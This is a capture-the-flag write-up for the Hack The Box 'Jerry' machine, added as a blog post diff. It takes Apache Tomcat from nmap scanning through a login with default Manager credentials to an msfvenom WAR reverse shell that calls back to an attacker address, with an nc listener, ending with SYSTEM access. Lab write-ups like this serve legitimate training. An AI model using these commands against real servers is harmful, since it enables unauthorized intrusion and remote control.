@@ -1,0 +1,95 @@
+---
+title: Jerry
+author: nf4ll
+date: 2022-11-28 16:29:00 +0000
+categories: [Hack The Box, Machines]
+tags: [Apache Tomcat, File upload, Remote Code Execution]
+math: true
+mermaid: true
+image:
+  path: /assets/img/posts/Jerry/Jerry.PNG
+  width: 1200
+  height: 600
+---
+# Write Up
+
+About Jerry machine:
+- OS: Windows
+- Difficulty: Easy
+- Release date: 2018-June-30
+- IP: 10.10.10.95
+
+## Preparation phase
+
+I skip the recognizement phase because we already have the information about this machine and its operative system. Also, you can ping your objective to see if the host is up or down. With this ping we can see the TTL value. The value depends on the operative system:
+- TTL = 64 -> Unix
+- TTL = 128 -> Windows
+
+## Scan phase
+
+Firstly, I run an active scan to get the open ports in the machine. For the scan I use a Syn Stealth Scan (-sS). 
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.95
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 16:04 CET
+Nmap scan report for 10.10.10.95
+Host is up (0.042s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
+```
+
+Now I must run another scan to identify the services and the version that are running in this port. To do this scan I run two parameters, -sC and -sV but we can mix in -sCV and We will get the same result.
+
+```bash
+nmap -p8080 -sCV 10.10.10.95
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 17:01 CET
+Nmap scan report for 10.10.10.95
+Host is up (0.048s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
+```
+
+## Explotation phase
+
+In the second place I go to the page to get more information. At this point we need to get the access to the machine, so once I scan and I can't find any ports with vulnerabilities I switch to the page to get any vulnerability. There is a curious button on the page and I click on it.
+
+![Desktop View](/assets/img/posts/Jerry/Main.PNG)
+
+A log in pop-up window opens to go to Manager Panel. I search on the Internet the default credentials for Apache Tomcat but I can't find any. The error page shows credentials for this Apache Tomacat version. I try these credentials `<user username="tomcat" password="s3cret"` and I cloud sign in.
+
+![Desktop View](/assets/img/posts/Jerry/Error.PNG)
+
+Once I access the Manager Panel I see a possible vulnerability. The page can deploy a file that you upload but you only can upload a .war file. I tried to upload a reverse shell with .php.war extension but the web application can't load it.
+
+![Desktop View](/assets/img/posts/Jerry/form.PNG)
+
+At this point I try to create a reverse shell with Msfvenom so I run the following command to create the malicious file:
+
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f war -o reverse.war`
+
+Now I need to enable a listen port to receive the connection from the reverse shell. You can enable a listener with Netcat. I turn on the port 443 in a listener mode with the following command:
+
+`nc -nlvp 443`
+
+I uploaded the file and I went to this resource to activate my reverse shell. To activate it you need to go to the path without extension (.war). In my caso I need to load the following page:
+`http://10.10.10.95:8080/reverse/`
+
+You need to activate the malicous application so I load this directory to get my shell.
+
+## Post-explotation phase
+
+In the last step I get the flags because I am Nt-authority system user, so you don't need to do a privilege scalation.
+
+![Desktop View](/assets/img/posts/Jerry/flags.PNG)
+
